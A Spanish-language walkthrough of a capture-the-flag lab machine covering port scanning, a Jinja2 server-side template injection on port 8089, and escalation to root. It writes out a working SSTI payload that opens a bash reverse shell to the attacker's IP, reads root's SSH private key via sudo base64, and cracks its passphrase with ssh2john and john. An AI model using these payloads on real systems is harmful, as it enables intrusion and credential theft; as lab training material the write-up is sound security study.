tags: #ssti #john #sudo #rce 
___
## Reconocimiento

```bash
ping -c 1 172.17.0.2
```

![[Anexos/Pasted image 20251030023323.png]]
Estamos ante un sistema linux, así que seguimos haciendo un escaneo básico de puertos, para conocer cuales están abiertos y buscar un vector de ataque. Para ello usamos el siguiente comando:

```bash
nmap -sS -p- --min-rate 5000 -n -Pn -vvv -oN ports 172.17.0.2
```

Esto nos permite exportar al fichero **ports** todos los puertos en formato nmap. Obtenemos lo siguiente:

![[Anexos/Pasted image 20251030023455.png]]

Ahora, vamos a lanzar el siguiente comando para averiguar cuál es la versión del servicio que corre por el puerto 80 y también lanzar unos scripts de nmap parra aplicar un reconocimiento:

```bash
nmap -sCV --min-rate 5000 -vvv -n -Pn -p22,80,8089 -vvv -oN version 172.17.0.2
```

![[Anexos/Pasted image 20251030023549.png]]

Vemos que por el puerto 8089 tenemos la siguiente web:

![[Anexos/Pasted image 20251030023634.png]]

![[Anexos/Pasted image 20251030030114.png]]

Vemos que estamos ante un posible SSTI (Server Side Template Injection), así que vamos a ver qué payload podemos usar.
En el archivo version, vemos que por el puerto 8089 corre un servicio web en python, con lo cual usaremos los payloads de Jinja2:

![[Anexos/Pasted image 20251030050114.png]]

![[Anexos/Pasted image 20251030050137.png]]

Sabiendo que tenemos una RCE, vamos a enviarnos una reverse shell del usuario verde a nuestra máquina de atacante:

```python
http://172.17.0.2:8089/?user={{%20self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27bash -c "bash -i >%26 /dev/tcp/192.168.70.86/443 0>%261"%27).read()%20}}
```

![[Anexos/Pasted image 20251030050532.png]]

![[Anexos/Pasted image 20251030050633.png]]

![[Anexos/Pasted image 20251030050743.png]]

Vamos a intentar leer el archivo passwd para descubrir otros usuarios pero no vemos nada.
Como sabemos que tenemos el puerto ssh abierto, vamos a intentar buscar el archivo id_rsa en la home de root, con el siguiente comando:

```bash
sudo base64 "/root/.ssh/id_rsa" | base64 -d
```

![[Anexos/Pasted image 20251030052043.png|500]]

Lo tenemos, así que nos lo vamos a copiar en nuestro directorio de atacante y vamos a loguearnos con el usuario root:

```bash
chmod 600 id_rsa
```

Vemos que nos pide una passphrase, así que hay que crackearla:

![[Anexos/Pasted image 20251030052433.png]]

Para ello usamos la herramienta john the reaper, de la siguiente forma:

```bash
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![[Anexos/Pasted image 20251030052817.png]]

Ahora sí, accedemos:

```bash
ssh -i id_rsa root@172.17.0.2
```

![[Anexos/Pasted image 20251030052918.png]]

